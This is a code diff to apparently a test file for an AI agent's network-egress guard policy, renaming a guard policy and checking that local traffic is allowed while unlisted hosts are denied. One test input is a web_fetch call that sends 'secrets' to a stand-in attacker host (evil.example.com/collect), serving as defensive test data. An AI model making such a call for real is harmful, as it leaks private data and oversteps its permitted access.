@@ -43,14 +43,14 @@ def _ev(tool, args, **kw):
 def test_policy_loads() -> None:
     s = ncg.policy_summary()
     check("shipped policy loads", s.get("loaded") is True, str(s))
-    check("policy has the demobot-guard + local-inference network policies",
-          {"demobot-guard", "local-inference"} <= set(s.get("network_policies") or []))
+    check("policy has the pseudoco-assistant-guard + local-inference network policies",
+          {"pseudoco-assistant-guard", "local-inference"} <= set(s.get("network_policies") or []))
     check("inference is local-only", s.get("inference_local_only") is True)
 
 
 def test_network_rules() -> None:
     v = _ev("web_fetch", {"url": "http://127.0.0.1:8001/api/toolguard/decoy-sink"})
-    check("egress to the DemoBot guard endpoint is allowed", v.should_block is False, str(v.reasons))
+    check("egress to the PseudoCo Assistant guard endpoint is allowed", v.should_block is False, str(v.reasons))
     v = _ev("web_fetch", {"url": "https://evil.example.com/collect", "body": "secrets"})
     check("egress to an unlisted host is denied", v.should_block is True)
     check("... attributed as NemoClaw: network egress", "NemoClaw: network egress" in v.rule_names, str(v.rule_names))
